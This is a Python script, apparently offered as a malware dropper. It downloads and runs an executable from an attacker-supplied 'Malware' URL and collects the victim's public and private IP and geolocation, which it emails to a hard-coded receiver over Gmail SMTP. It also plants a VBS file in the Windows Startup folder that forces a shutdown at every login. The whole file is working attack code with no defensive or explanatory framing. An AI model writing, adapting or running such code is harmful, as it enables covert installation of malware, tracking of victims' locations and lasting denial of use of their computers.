import os
import requests
import shutil
import subprocess
import smtplib
import socket
import sys

# URL of the file you want to download
url = "Put any URL of the Malware you want to be opened."
sender_email = 'Example@gmail.com'
receiver_email = 'HakeemExample@gmail.com'
app_password = 'YOUR EMAIL APP PASSWORD(Search a tutorial if you dont know)'

# GET IP SCRIPT
def get_public_ip():
    try:
        public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
        return public_ip
    except Exception as e:
        print("Error retrieving public IP address:", str(e))
        return None

def get_location():
    try:
        # Make a request to the ipinfo.io API
        response = requests.get('https://ipinfo.io/json')

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            data = response.json()
            location = data.get('city', '') + ', ' + data.get('region', '') + ', ' + data.get('country', '')
            return data, location
        else:
            print("Failed to retrieve location. Status code:", response.status_code)
            return None, None
    except Exception as e:
        print("Error:", str(e))
        return None, None

def send_ip_email(public_ip, private_ip, location_data, location):
    subject = 'IP Addresses and Location'
    message = f'Public IP: {public_ip}\nPrivate IP: {private_ip}\nLocation Data: {location_data}\nLocation: {location}'
    email_text = f'Subject: {subject}\n\n{message}'

    try:
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
        smtp_server.starttls()
        smtp_server.login(sender_email, app_password)
        smtp_server.sendmail(sender_email, receiver_email, email_text)
        smtp_server.quit()
    except Exception as e:
        print("Error sending email:", str(e))



# SHUT DOWN FILE CREATION IN STARTUP
def create_vbs_file_in_startup():
    try:
        vbs_content = '''Dim fso, currentScript, startupFolder

Set fso = CreateObject("Scripting.FileSystemObject")
Set currentScript = fso.GetFile(WScript.ScriptFullName)

Set shell = CreateObject("WScript.Shell")
startupFolder = shell.SpecialFolders("Startup")

fso.CopyFile currentScript.Path, startupFolder & "\\" & fso.GetFileName(WScript.ScriptFullName)

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd"

WScript.Sleep 1000

shell.Run "shutdown.exe -s -t 1"
Ending = 0.1

Set currentScript = Nothing
Set fso = Nothing
Set shell = Nothing'''

        startup_folder = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        vbs_file_path = os.path.join(startup_folder, "custom.vbs")

        with open(vbs_file_path, "w") as vbs_file:
            vbs_file.write(vbs_content)

    except Exception as e:
        print("Error creating VBS file in startup:", str(e))

def create_dib_folder():
    try:
        documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
        dib_folder_path = os.path.join(documents_folder, "DiB")

        if not os.path.exists(dib_folder_path):
            os.makedirs(dib_folder_path)
        return dib_folder_path
    except Exception as e:
        print("Error creating 'DiB' folder:", str(e))
        return None

def download_file(url, folder_path):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            local_file_path = os.path.join(folder_path, "downloaded-file.exe")
            with open(local_file_path, "wb") as file:
                file.write(response.content)
            return local_file_path
        else:
            print(f"Failed to download file. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while downloading the file: {e}")
        return None

if __name__ == "__main__":
    public_ip = get_public_ip()
    private_ip = socket.gethostbyname(socket.gethostname())
    location_data, location = get_location()

    if public_ip and private_ip:
        dib_folder = create_dib_folder()
        if dib_folder:
            downloaded_file_path = download_file(url, dib_folder)
            if downloaded_file_path:
                subprocess.Popen([downloaded_file_path], shell=True)

        send_ip_email(public_ip, private_ip, location_data, location)
        create_vbs_file_in_startup()
        sys.exit()
